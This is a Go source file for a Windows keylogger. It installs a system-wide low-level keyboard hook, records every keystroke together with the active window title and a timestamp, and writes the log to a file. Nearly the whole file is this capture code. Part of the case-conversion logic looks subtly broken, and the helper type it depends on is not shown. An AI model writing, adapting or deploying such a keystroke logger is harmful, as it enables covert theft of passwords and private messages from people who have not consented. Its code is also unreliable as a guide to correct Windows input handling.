package windows

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	MAPVK_VK_TO_CHAR = 0x02
	WH_KEYBOARD_LL   = 13
)

type KbdHookStruct struct {
	vkCode      uintptr
	scanCode    uintptr
	flags       uintptr
	time        uintptr
	dwExtraInfo uintptr
}

type KeyLogger struct {
	OutputFile *os.File
	lastWindow string
	FORMAT     int
	manager    *WindowsManager
}

func NewKeyLogger(outputFile *os.File) *KeyLogger {
	return &KeyLogger{
		OutputFile: outputFile,
		lastWindow: "",
		FORMAT:     0,
		manager:    NewWindowManager(),
	}
}

func (l *KeyLogger) ListenKeyboard() {
	keyboardHook, _, _ := l.manager.setWindowsHook.Call(
		WH_KEYBOARD_LL,
		syscall.NewCallback(func(code int, wParam uintptr, lParam uintptr) uintptr {
			return l.keyboardLL(code, wParam, lParam, l.Save)
		}), // Callback function
		0, // Module handle (0 for current process)
		0, // Thread ID (0 for all existing threads)
	)

	// Create a channel to listen for interrupt signal (Ctrl+C)
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

	fmt.Println("Listening to keyboard events. Press Ctrl+C to exit...")

	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		pt      struct {
			x, y int32
		}
	}

	for {
		_, _, _ = l.manager.getMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		select {
		case <-interrupt:
			_, _, _ = l.manager.unhookWindowsHookEx.Call(keyboardHook)
			return
		default:
			_, _, _ = l.manager.callNextHook.Call(keyboardHook, uintptr(msg.message), msg.wParam, msg.lParam)
		}
	}
}

func (l *KeyLogger) keyboardLL(code int, wParam uintptr, lParam uintptr, outputFunc func(uintptr)) uintptr {
	// Process only keydown events
	if wParam == 256 {
		kbd := (*KbdHookStruct)(unsafe.Pointer(lParam))
		outputFunc(kbd.vkCode)
	}
	return 0
}

func (l *KeyLogger) Save(keyStroke uintptr) {
	var output strings.Builder

	// Ignore mouse clicks
	if keyStroke == 1 || keyStroke == 2 {
		return
	}

	foreground := l.manager.GetForegroundWindow()

	var layout uintptr

	if foreground != 0 {
		// Get keyboard layout of the thread
		threadID, err := l.manager.GetWindowThreadProcessId(foreground)
		if err != nil {
			fmt.Println("Error getting window thread process ID:", err)
			return
		}

		layout, err = l.manager.GetKeyboardLayout(threadID)
		if err != nil {
			fmt.Println("Error getting keyboard layout:", err)
			return
		}
	}

	if foreground != 0 {
		windowTitle, err := l.manager.GetWindowText(foreground)
		if err != nil {
			fmt.Println("Error getting window text:", err)
			return
		}

		if windowTitle != l.lastWindow {
			l.lastWindow = windowTitle

			// Get time
			t := time.Now()
			s := t.Format("Jan 2 2006 15:04:05")

			output.WriteString(fmt.Sprintf("\n\n[Window: %s - at %s] ", windowTitle, s))
		}
	}

	var key = l.parseIntToVK(int(keyStroke), layout)
	// Format key stroke
	// Change FORMAT value to 10, 16, or any other number as needed
	switch l.FORMAT {
	case 10:
		output.WriteString(fmt.Sprintf("[%d]", key))
	case 16:
		output.WriteString(fmt.Sprintf("[%X]", key))
	default:
		keyName, found := keyName[key]
		if found {
			output.WriteString(keyName)
		} else {
			lowercase := (l.GetKeyStateFunc(VK_CAPITAL) & 0x0001) == 0

			// Check shift key
			if (l.GetKeyStateFunc(VK_SHIFT)&0x1000) != 0 ||
				(l.GetKeyStateFunc(VK_LSHIFT)&0x1000) != 0 ||
				(l.GetKeyStateFunc(VK_RSHIFT)&0x1000) != 0 {
				lowercase = !lowercase
			}

			// Map virtual key according to keyboard layout

			// Convert to lowercase if needed
			if !lowercase {
				key = uintptr(strings.ToLower(fmt.Sprint(key))[0])
			}
			output.WriteByte(byte(key))
		}
	}

	// Instead of opening and closing file handlers every time, keep file open and flush.
	l.OutputFile.WriteString(output.String())
	l.OutputFile.Sync()

	fmt.Print(output.String())
}

func (l *KeyLogger) GetKeyStateFunc(keyCode uintptr) int16 {
	r, err := l.manager.GetKeyState(keyCode)
	if err != nil {
		fmt.Println("Error getting key state:", err)
		return 0
	}
	return r
}

func (l *KeyLogger) parseIntToVK(keyStroke int, layout uintptr) uintptr {
	virtualKey, err := l.manager.MapVirtualKeyEx(keyStroke, MAPVK_VK_TO_CHAR, layout)
	if err != nil {
		fmt.Println("Error mapping virtual key:", err)
		return 0
	}
	return virtualKey
}
